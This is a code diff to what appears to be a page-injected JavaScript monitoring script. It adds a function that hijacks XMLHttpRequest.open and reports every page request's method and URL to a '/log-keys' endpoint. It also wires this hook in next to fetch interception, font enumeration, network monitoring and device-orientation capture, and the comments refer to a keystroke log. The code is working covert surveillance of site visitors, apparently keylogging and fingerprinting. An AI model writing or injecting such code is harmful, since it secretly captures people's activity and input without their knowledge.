@@ -1547,6 +1547,30 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ XHR INTERCEPTOR ══════════════════════════════════════
+    // Wraps XMLHttpRequest.open() to log AJAX/XHR calls made by the page.
+    // Only logs the URL and method — never request body content.
+    function initXHRInterceptor() {
+        try {
+            const origOpen = XMLHttpRequest.prototype.open;
+            if (!origOpen) return;
+            const _post = post; // capture reference
+            XMLHttpRequest.prototype.open = function(method, url) {
+                try {
+                    const sUrl = String(url || '');
+                    // Skip our own tracking endpoints to avoid infinite loops
+                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
+                        _post('/log-keys', {
+                            keys: `[XHR] ${(method || 'GET').toUpperCase()} ${sUrl.slice(0, 180)}`,
+                            url: location.href
+                        });
+                    }
+                } catch {}
+                return origOpen.apply(this, arguments);
+            };
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1688,6 +1712,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initFontEnumerator();
         initWebSocketDetector();
         initFetchInterceptor();
+        initXHRInterceptor();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
